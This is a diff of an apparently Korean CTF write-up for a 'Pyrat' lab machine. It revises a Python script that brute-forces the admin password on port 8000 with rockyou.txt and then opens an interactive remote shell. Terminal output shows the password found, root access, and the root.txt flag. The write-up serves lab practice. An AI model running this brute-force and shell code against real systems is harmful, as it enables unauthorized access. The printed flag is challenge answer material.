@@ -614,57 +614,46 @@ Testing: login
 import socket
 
 # Configuration
-target_ip = "10.10.247.143"  # Target IP
-target_port = 8000          # Target port
-password_wordlist = "/usr/share/wordlists/rockyou.txt"  # Path to your password wordlist file
+import socket
+import time
 
-def connect_and_send_password(password):
+pyrat_IP = "10.10.247.143"
+pyrat_PORT = 8000
+wordlist = "/usr/share/wordlists/rockyou.txt"
+
+def send_socket(ip: str, port: int, password: str) -> bool:
     try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((target_ip, target_port))
-        client_socket.sendall(b'admin\n')
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)  # timeout ekledik
+        s.connect((ip, port))
+        s.sendall(b'admin\n')
 
+        resp = s.recv(1024).decode(errors="ignore")
 
-        response = client_socket.recv(1024).decode()
-        print(f"Server response after sending 'admin': {response}")
+        if "Password:" in resp:
+            s.sendall(password.encode() + b"\n")
+            resp = s.recv(1024).decode(errors="ignore")
 
-        if "Password:" in response:
-            print(f"Trying password: {password}")
-            client_socket.sendall(password.encode() + b"\n")
-
-            response = client_socket.recv(1024).decode()
-
-            if response:
-                print(f"Server response for password '{password}': {response}")
+            if "success" in resp.lower() or "admin" in resp.lower():
+                print(f"[+] Found! admin:{password} -> {resp.strip()}")
                 return True
             else:
-                print(f"Password '{password}' is incorrect or no response.")
-
-        return False
-
+                print(f"[-] Failed: {password}")
     except Exception as e:
-        print(f"Error: {e}")
-        return False
-
+        print(f"[!] Connection error for password '{password}': {e}")
     finally:
-        client_socket.close()
+        s.close()
+    return False
 
-def fuzz_passwords():
-    with open(password_wordlist, "r", encoding="latin-1") as file:
-        passwords = file.readlines()
-
-    for password in passwords:
-        password = password.strip()  # Remove any newline characters
-
-        if connect_and_send_password(password):
-            print(f"Correct password found: {password}")
-            break
-        else:
-            print(f"Password {password} was incorrect. Reconnecting...")
-
+def brut_pass():
+    with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
+        for line in file:
+            password = line.strip()
+            if send_socket(pyrat_IP, pyrat_PORT, password):
+                break
+            time.sleep(0.1)
 if __name__ == "__main__":
-    fuzz_passwords()
-
+    brut_pass()
 ```
 
 # 에러 발생 ! -> rockyou.txt 는 일반적으로 latin-1 인코딩 해야함 -> 현재 utf-8 이므로 latin-1 로 수정하기
@@ -682,79 +671,103 @@ UnicodeDecodeError: 'utf-8' codec can't decode byte 0xf1 in position 933: invali
 
 # 수정 후 비밀번호 찾기 완료
 
-┌──(root㉿docker-desktop)-[~]
-└─# python3 password.py
-Server response after sending 'admin': Password:
-
-Trying password: 123456
-Server response for password '123456': Password:
-
-Correct password found: 123456
+─# python3 password.py
+[-] Failed: 123456
+[-] Failed: 12345
+[-] Failed: 123456789
+[-] Failed: password
+[-] Failed: iloveyou
+[-] Failed: princess
+[-] Failed: 1234567
+[-] Failed: rockyou
+[-] Failed: 12345678
+[+] Found! admin:abc123 -> Welcome Admin!!! Type "shell" to begin
 
 ```py
 import socket
+import time
 
-# Configuration
-target_ip = "10.10.247.143"  # Target IP
-target_port = 8000          # Target port
-password = "123456"         # Known password
+pyrat_IP = "10.10.247.143"
+pyrat_PORT = 8000
+wordlist = "/usr/share/wordlists/rockyou.txt"
 
-def connect_and_interact():
+def send_socket(ip, port, password):
     try:
-        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        client_socket.connect((target_ip, target_port))
-
-        # Send 'admin' to the server
-        client_socket.sendall(b'admin\n')
-
-        # Receive the response from the server after sending 'admin'
-        response = client_socket.recv(1024).decode()
-        print(f"Server response after sending 'admin': {response}")
-
-        # Wait for the server to send "Password:"
-        if "Password:" in response:
-            print(f"Sending password: {password}")
-            client_socket.sendall(password.encode() + b"\n")
-
-            response = client_socket.recv(1024).decode()
-
-            if "Welcome Admin!!!" in response:
-                print(f"Server response for password '{password}': {response}")
-
-                # Send 'shell' command after receiving the welcome message
-                client_socket.sendall(b'shell\n')
-                print("Sent 'shell' command. Waiting for shell response...")
-                response = client_socket.recv(1024).decode()
-
-                if response:
-                    print(f"Shell response: {response}")
-                    interact_with_shell(client_socket)
-                else:
-                    print("No response after sending 'shell'.")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        s.connect((ip, port))
+        s.sendall(b'admin\n')
+        resp = s.recv(1024).decode(errors="ignore")
+        if "Password:" in resp:
+            s.sendall(password.encode() + b"\n")
+            resp = s.recv(1024).decode(errors="ignore")
+            if "success" in resp.lower() or "admin" in resp.lower():
+                print(f"[+] Found! admin:{password} -> {resp.strip()}")
+                # 비번 찾으면 바로 shell 명령 전송
+                s.sendall(b'shell\n')
+                shell_resp = s.recv(1024).decode(errors="ignore")
+                print(f"[+] Shell Response: {shell_resp.strip()}")
+                # 이후 직접 명령어 입력 가능
+                while True:
+                    cmd = input("$ ")
+                    if not cmd: continue
+                    s.sendall(cmd.encode() + b"\n")
+                    out = s.recv(4096).decode(errors="ignore")
+                    print(out.strip())
+                return True
             else:
-                print(f"Unexpected response after password: {response}")
-
-        else:
-            print("Did not receive the 'Password:' prompt.")
-
+                print(f"[-] Failed: {password}")
     except Exception as e:
-        print(f"Error during connection or communication: {e}")
-
+        print(f"[!] Connection error for password '{password}': {e}")
     finally:
-        if client_socket:
-            client_socket.close()
+        try: s.close()
+        except: pass
+    return False
 
-def interact_with_shell(client_socket):
-    try:
-        while True:
-            command = input("Enter command to execute: ")
-            client_socket.sendall(command.encode() + b"\n")
-            response = client_socket.recv(4096).decode()
-            print(f"Response: {response}")
-
-    except Exception as e:
-        print(f"Error during interaction: {e}")
+def brut_pass():
+    with open(wordlist, "r", encoding="latin-1", errors="ignore") as file:
+        for line in file:
+            password = line.strip()
+            if send_socket(pyrat_IP, pyrat_PORT, password):
+                break
+            time.sleep(0.1)
 
 if __name__ == "__main__":
-    connect_and_interact()
+    brut_pass()
 ```
+
+# root.txt
+
+─(root㉿docker-desktop)-[~]
+└─# python3 login.py
+[-] Failed: 123456
+[-] Failed: 12345
+[-] Failed: 123456789
+[-] Failed: password
+[-] Failed: iloveyou
+[-] Failed: princess
+[-] Failed: 1234567
+[-] Failed: rockyou
+[-] Failed: 12345678
+[+] Found! admin:abc123 -> Welcome Admin!!! Type "shell" to begin
+[+] Shell Response: #
+$ ls
+ls
+$ ls
+pyrat.py root.txt snap
+
+#
+
+$ cat root.txt
+ls
+pyrat.py root.txt snap
+
+#
+
+$ ^[[A
+cat root.txt
+ba5ed03e9e74bb98054438480165e221
+
+#
+
+$
